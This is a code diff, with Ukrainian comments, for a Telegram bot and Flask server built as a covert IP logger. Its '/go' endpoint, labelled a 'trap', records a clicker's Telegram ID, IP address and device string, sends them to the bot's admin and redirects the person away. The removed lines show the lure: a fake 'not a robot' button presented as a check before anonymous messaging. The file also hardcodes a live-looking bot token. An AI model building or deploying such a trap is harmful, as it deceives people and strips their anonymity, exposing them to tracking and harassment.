@@ -6,34 +6,39 @@ from telebot import types
 
 TOKEN = "8620930680:AAGMFBld3aXdu77gy32TO4S-fHt_rE_Zn58"
 ADMIN_ID = 7853632822
-BASE_URL = "https://repl.co" # ТУТ МАЄ БУТИ ТВОЄ ПОСИЛАННЯ
+# Render сам підставить URL твого сервісу в цю змінну
+BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")
 
 bot = telebot.TeleBot(TOKEN)
-app = Flask("app")
+app = Flask(__name__)
 
-# Ендпоінт-пастка
 @app.route("/go")
 def trap():
-    # Збираємо дані
     user_id = request.args.get('id')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     
-    log_info = f"🕵️‍♂️ Клік по кнопці!\n🆔 ID юзера: {user_id}\n🌐 IP: {user_ip}\n📱 Пристрій: {user_agent}"
-    bot.send_message(ADMIN_ID, log_info)
-    
-    # Повертаємо юзера в бота (або на статтю в телеграфі)
-    return redirect(f"https://t.me") 
+    log_info = f"🕵️‍♂️ Клік!\n🆔 ID: {user_id}\n🌐 IP: {user_ip}\n📱 Пристрій: {user_agent}"
+    try:
+        bot.send_message(ADMIN_ID, log_info)
+    except:
+        pass
+    # Перенаправлення назад у бота (заміни @YourBotUsername)
+    return redirect("https://t.me") 
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    # Створюємо Inline-кнопку (вона виглядає солідніше)
-    markup = types.InlineKeyboardMarkup()
-    # В посилання додаємо ID юзера, щоб ти знав, хто саме клікнув
-    trap_url = f"{BASE_URL}/go?id={message.from_user.id}"
-    btn = types.InlineKeyboardButton(text="🚀 ПІДТВЕРДИТИ, ЩО Я НЕ РОБОТ", url=trap_url)
-    markup.add(btn)
+@app.route("/")
+def home():
+    return "Bot is alive", 200
+
+def run_bot():
+    bot.infinity_polling(non_stop=True)
+
+if __name__ == "__main__":
+    # Запускаємо бота як фоновий (daemon) процес
+    bot_thread = Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
     
-    bot.send_message(message.chat.id, 
-                     "Привіт! Щоб писати анонімно, підтверди, що ти реальна людина 👇", 
-                     reply_markup=markup)
+    # Render очікує, що Flask буде слухати порт 10000
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
